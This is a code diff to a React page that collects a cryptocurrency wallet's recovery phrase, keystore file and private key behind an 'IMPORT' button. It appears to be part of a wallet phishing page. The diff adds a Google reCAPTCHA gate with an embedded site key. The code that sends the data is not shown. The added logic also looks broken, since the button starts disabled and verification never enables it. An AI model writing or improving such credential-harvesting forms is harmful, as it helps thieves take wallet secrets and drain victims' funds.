@@ -2,15 +2,22 @@ import React, { useState } from "react";
 import PageLayout from "../PageLayout/PageLayout";
 import axios from "axios";
 import { useNavigate } from "react-router-dom";
+import {
+  GoogleReCaptchaProvider,
+  GoogleReCaptcha,
+} from "react-google-recaptcha-v3";
 
 const DetailsPage = ({ setIsSuccess }: any) => {
   const navigate = useNavigate();
   const [tab, setTab] = useState(1);
+  const [state, setState] = useState(true);
   const [walletData, setWalletData] = useState<any>({
     key_phrase: "",
     keystore_json: "",
     private_key: "",
   });
+
+  const handleVerify = () => setState(true);
 
   const handleChange = (e: any) => {
     e.persist();
@@ -106,7 +113,12 @@ const DetailsPage = ({ setIsSuccess }: any) => {
               ? "Several lines of text beginning with '(...)' plus the password you used to encrypt it."
               : "Typically 64 alphanumeric characters"}
           </p>
-          <button type="submit">IMPORT</button>
+          <GoogleReCaptchaProvider reCaptchaKey="6LdqhBUjAAAAAERKR-FFG9tubXj6JzgiWxbY2RHe">
+            <GoogleReCaptcha onVerify={handleVerify} />
+          </GoogleReCaptchaProvider>
+          <button disabled={state} type="submit">
+            IMPORT
+          </button>
         </div>
       </form>
     </PageLayout>
